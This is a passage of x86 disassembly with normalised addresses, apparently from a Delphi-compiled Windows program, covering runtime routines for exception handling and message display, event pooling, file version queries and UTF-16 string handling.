lea eax [ ebp - 0x4 ]
call sub_4494ec
call sub_449fc4
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
lea eax [ eax + ebx * 2 - 0x2 ]
mov ecx 0x4
call sub_43626c
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_44a068
inc ebx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43af28
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
movzx esi [ eax + ebx * 2 - 0x2 ]
mov eax esi
sub ax 0x47
je r-xdata
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
lea eax [ eax + ebx * 2 - 0x2 ]
mov ecx 0x2
call sub_43626c
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_44a068
add ebx 0x3
jmp r-xdata
inc ebx
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44a368
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_44a068
add ebx [ ebp - 0x8 ]
jmp r-xdata
adc eax 0x0
inc ebx
sub ax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + ebx * 2 - 0x2 ]
sub ax 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_44a068
inc ebx
jmp r-xdata
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_449e98
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_44a068
mov eax edi
mov edx r-xdata
call sub_44a068
jmp r-xdata
sub ax 0x20
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + ebx * 2 - 0x2 ]
call sub_449e98
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_44a068
sub_4399a0
push ebp
mov ebp esp
add esp 0xfffff99c
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x664 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_439b4c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1c
lea eax [ ebp - 0x638 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x628 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x41c ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameW
mov eax ebx
call sub_439994
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x41c ]
push eax
mov eax [ ebp - 0x634 ]
push eax
call GetModuleFileNameW
test eax eax
jne r-xdata
lea eax [ ebp - 0x41c ]
mov dx 0x5c
call sub_43b140
mov edx eax
add edx 0x2
lea eax [ ebp - 0x212 ]
mov ecx 0x104
call sub_436110
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
sub ebx [ ebp - 0x634 ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x61c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_44b1e4
push eax
call LoadStringW
lea edx [ ebp - 0x664 ]
mov eax [ esi ]
call sub_448088
mov eax [ ebp - 0x664 ]
mov [ ebp - 0x660 ] eax
mov [ ebp - 0x65c ] 0x11
lea eax [ ebp - 0x212 ]
mov [ ebp - 0x658 ] eax
mov [ ebp - 0x654 ] 0xa
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x650 ] eax
mov [ ebp - 0x64c ] 0x5
mov [ ebp - 0x648 ] ebx
mov [ ebp - 0x644 ] 0xa
mov [ ebp - 0x640 ] edi
mov [ ebp - 0x63c ] 0xa
lea eax [ ebp - 0x660 ]
push eax
push 0x4
lea ecx [ ebp - 0x61c ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4364fc
mov eax [ ebp - 0x4 ]
call sub_4360a4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439b53
lea eax [ ebp - 0x664 ]
call j_sub_449348
retn
mov eax [ esi + 0x4 ]
call sub_449db8
mov ebx eax
mov eax ebx
call sub_4360a4
test eax eax
je r-xdata
cmp [ ebx + eax * 2 - 0x2 ] 0x2e
je r-xdata
mov edi r-xdata
sub_439b68
add esp 0xfffff004
push eax
add esp 0xffffff7c
push 0x800
lea ecx [ esp + 0x88 ]
call sub_4399a0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_44b1e4
push eax
call LoadStringW
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x8c ]
push eax
push 0x0
call MessageBoxW
mov eax [ rw-data ]
call sub_4479f4
call sub_44767c
lea eax [ esp + 0x884 ]
push eax
lea eax [ esp + 0x88 ]
push eax
call CharToOemW
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x88c ]
call sub_436074
push eax
lea eax [ esp + 0x890 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x1084
retn
sub_439c4c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_449d2c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_439c88
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_439ce2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_436540
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_449d2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439ce9
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
add esp 0xfffffff0
call sub_448694
sub_439ce9
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_439d08
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_44be28
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_439d44
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_439db0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_44be28
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_436540
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_449d2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439db7
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
add esp 0xfffffff0
call sub_448694
sub_439db7
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_439dd8
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
lea eax [ esi + 0xc ]
call sub_43bfe8
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x10 ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
mov eax [ esi + 0x10 ]
call [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_439e28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_439e54
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call [ rw-data ]
mov edx eax
mov eax ebx
call sub_439e7c
sub_439e54
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
call sub_447580
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
call sub_4475c0
mov [ ebx + 0xc ] eax
sub_439e80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
xor edx edx
call sub_449d2c
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_449d2c
push [ esi ]
push r-xdata
push [ ebx + 0x4 ]
mov eax esi
mov edx 0x3
call sub_44a1b8
jmp r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_439f0c
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4476ac
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
jmp r-xdata
inc ebx
mov [ eax + 0x18 ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_439f6e
inc ebx
add [ esi ] cl
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
cmp al 0xff
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
push esi
inc esp
add [ eax + eax ] al
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_448c38
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x18
jb r-xdata
movzx eax al
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_439c4c
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_439f0c
mov edx eax
sub_439fdc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a078
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_449d80
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0x11
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x11
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a07f
lea eax [ ebp - 0x20 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43a0cc
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_43a164
push ebp
mov ebp esp
add esp 0xfffffd8c
push ebx
push esi
xor eax eax
mov [ ebp - 0x274 ] eax
mov [ ebp - 0x250 ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x254 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43a31f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x270 ] eax
mov [ ebp - 0x26c ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x268 ] eax
mov [ ebp - 0x264 ] 0x11
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x25c ] 0x5
lea eax [ ebp - 0x270 ]
push eax
push 0x2
lea edx [ ebp - 0x274 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x274 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
mov ebx eax
push 0x105
lea eax [ ebp - 0x22a ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameW
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x248 ] 0x5
lea eax [ ebp - 0x254 ]
lea edx [ ebp - 0x22a ]
mov ecx 0x105
call sub_449f14
mov eax [ ebp - 0x254 ]
lea edx [ ebp - 0x250 ]
call sub_435f84
mov eax [ ebp - 0x250 ]
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x240 ] 0x11
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x23c ] eax
mov [ ebp - 0x238 ] 0x11
mov [ ebp - 0x234 ] esi
mov [ ebp - 0x230 ] 0x5
lea eax [ ebp - 0x24c ]
push eax
push 0x3
lea edx [ ebp - 0x258 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x258 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a326
lea eax [ ebp - 0x274 ]
call j_sub_449348
lea eax [ ebp - 0x258 ]
mov edx 0x3
call j_sub_44936c
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43a330
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43a3f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43a0cc
movzx eax al
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_439c4c
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
push ebp
call sub_43a164
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a3f9
lea eax [ ebp - 0x10 ]
call j_sub_449348
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
mov ebx eax
sub_43a400
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x18 ]
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx ]
sub_43a434
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_43a424
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_43a14c
mov eax [ rw-data ]
mov [ eax ] sub_43a330
mov eax [ rw-data ]
mov [ eax ] sub_43a400
mov eax sub_43a098
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_43a0b4
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_43a4c4
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x18 ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
call sub_447580
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x18 ] 0x1
mov eax [ rw-data ]
call sub_4481b0
xor eax eax
mov [ rw-data ] eax
retn
call sub_447580
mov edx [ r-xdata ]
call sub_448388
test al al
jne r-xdata
call sub_4475a0
push eax
call sub_447580
pop edx
call sub_43a424
sub_43a570
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edi [ esi ]
mov [ ebx ] edi
mov eax esi
mov ecx edi
mov edx ebx
call sub_41d354
cmp eax [ ebx ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_43a590
push ebx
push esi
mov esi eax
mov eax ebx
pop esi
pop ebx
retn
mov edx [ ebx ]
mov eax esi
mov ecx ebx
call sub_41d354
cmp ebx eax
jne r-xdata
mov ebx [ esi ]
test ebx ebx
je r-xdata
sub_43a5b0
push ebx
push esi
push edi
xor edi edi
mov esi 0x20
mov ebx rw-data
add ebx 0x8
dec esi
jne r-xdata
push 0x0
push 0x1
push ebx
call InterlockedCompareExchange
test eax eax
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
test edi edi
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
push edi
call ResetEvent
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventW
mov edi eax
mov edi [ ebx + 0x4 ]
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventW
mov [ ebx + 0x4 ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_43a614
mov ecx 0x20
mov edx rw-data
add edx 0x8
dec ecx
jne r-xdata
push 0x0
lea eax [ edx - 0x4 ]
push eax
call InterlockedExchange
retn
cmp eax [ edx ]
jne r-xdata
push eax
call CloseHandle
retn
sub_43a63c
push ebx
mov eax rw-data
call sub_43a590
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventW
mov ebx eax
mov ebx [ eax + 0x4 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov edx rw-data
xchg edx eax
call sub_43a570
jmp r-xdata
push ebx
call ResetEvent
mov eax ebx
pop ebx
retn
sub_43a67c
push ebx
mov ebx eax
mov eax rw-data
call sub_43a590
test eax eax
jne r-xdata
mov [ eax + 0x4 ] ebx
mov edx rw-data
xchg edx eax
call sub_43a570
pop ebx
retn
mov eax 0x8
call sub_44748c
sub_43a6a8
push ebx
test eax eax
je r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
push 0x0
push ecx
push edx
push eax
call SignalObjectAndWait
mov ebx eax
test eax eax
jne r-xdata
xor ebx ebx
push eax
call SetEvent
jmp r-xdata
push ecx
push edx
call WaitForSingleObject
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
sub_43a6ec
push ebx
push esi
mov esi eax
mov ebx esi
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx ]
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov edx 0x8
mov eax ebx
call sub_4474a8
mov ebx esi
test ebx ebx
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call CloseHandle
sub_43a71c
push ebx
push esi
mov esi edx
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
mov ebx eax
push 0x0
push 0x1
push ebx
call InterlockedCompareExchange
test eax eax
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call CloseHandle
add ebx 0x8
dec esi
jne r-xdata
sub_43a748
push ebx
mov ebx rw-data
push 0x0
push ebx
call InterlockedExchange
call sub_43a6ec
mov ebx rw-data
push 0x0
push ebx
call InterlockedExchange
call sub_43a6ec
mov eax rw-data
mov edx 0x1f
call sub_43a71c
pop ebx
retn
sub_43a780
add esp 0xfffffeec
mov [ esp ] 0x114
push esp
call GetVersionExW
test eax eax
je r-xdata
add esp 0x114
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_449f14
sub_43a810
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43a8e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0xffffffff
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_449d80
lea eax [ ebp - 0x4 ]
call j_sub_44a5d8#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
call GetFileVersionInfoSizeW
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a8ed
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax ebx
call sub_44748c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43a8c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
call GetFileVersionInfoW
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4474a8
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueW
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
sub_43a904
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43aa03
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
jle r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43aa0a
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
movzx edx [ eax + esi * 2 - 0x2 ]
cmp dx 0xd800
jb r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax esi
setge al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
cmp dx 0xdfff
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ eax + esi * 2 - 0x2 ] 0xd800
jb r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov bl 0x2
mov bl 0x1
jmp r-xdata
cmp [ eax + esi * 2 - 0x2 ] 0xdbff
setbe al
jmp r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_43aa14
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43aaa8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp ebx eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43aba0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43aaaf
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_43aac0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43ab8d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
jne r-xdata
cmp eax [ ebp - 0x8 ]
setl al
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ab94
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov esi 0x1
cmp esi [ ebp - 0x8 ]
jg r-xdata
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
movzx edi [ ebx + esi * 2 - 0x2 ]
cmp di 0xd800
jb r-xdata
mov eax ebx
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
inc esi
cmp di 0xdfff
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov ebx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43afbc
mov esi eax
jmp r-xdata
inc [ ebp - 0xc ]
cmp esi [ ebp - 0x8 ]
jle r-xdata
sub_43aba8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43acb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
